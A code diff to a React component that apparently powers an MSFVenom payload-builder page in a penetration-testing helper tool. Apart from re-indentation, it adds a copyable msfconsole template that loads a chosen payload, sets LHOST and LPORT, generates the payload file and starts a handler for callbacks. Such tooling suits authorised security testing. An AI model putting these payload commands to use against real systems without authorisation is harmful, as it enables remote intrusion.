@@ -300,16 +300,16 @@ const MSFVenom = () => {
                 {t('msfvenom_title')}
             </Title>
             <Paragraph style={{
-                    margin: 15
-                }}>
-                    <div>
-                        {paragraphs.map((paragraph, index) => (
-                            <Paragraph key={index}>
-                                {paragraph}
-                            </Paragraph>
-                        ))}
-                    </div>
-                </Paragraph>
+                margin: 15
+            }}>
+                <div>
+                    {paragraphs.map((paragraph, index) => (
+                        <Paragraph key={index}>
+                            {paragraph}
+                        </Paragraph>
+                    ))}
+                </div>
+            </Paragraph>
             <Divider />
             <div
                 key='a'
@@ -728,6 +728,18 @@ const MSFVenom = () => {
                         </Text>
                     </pre>
                 </Paragraph>
+                <Divider />
+                <Paragraph>
+                    {t('msfconsole_cmd1')}
+                </Paragraph>
+                <Paragraph>
+                    <pre>
+                        <Text copyable>
+                            {`use ${values.Payload}\nset LHOST ${values.LHOST}\nset LPORT ${values.LPORT}\ngenerate -f ${Format} -o ${Outfile}\nto_handler`}
+                        </Text>
+                    </pre>
+                </Paragraph>
+                <Divider />
                 <Paragraph>
                     {t('msfvenom_cmd2')}
                 </Paragraph>
@@ -736,6 +748,7 @@ const MSFVenom = () => {
                         <Text copyable>{launchCommand}</Text>
                     </pre>
                 </Paragraph>
+                <Divider />
                 <Paragraph>
                     {t('msfvenom_cmd3')}
                 </Paragraph>
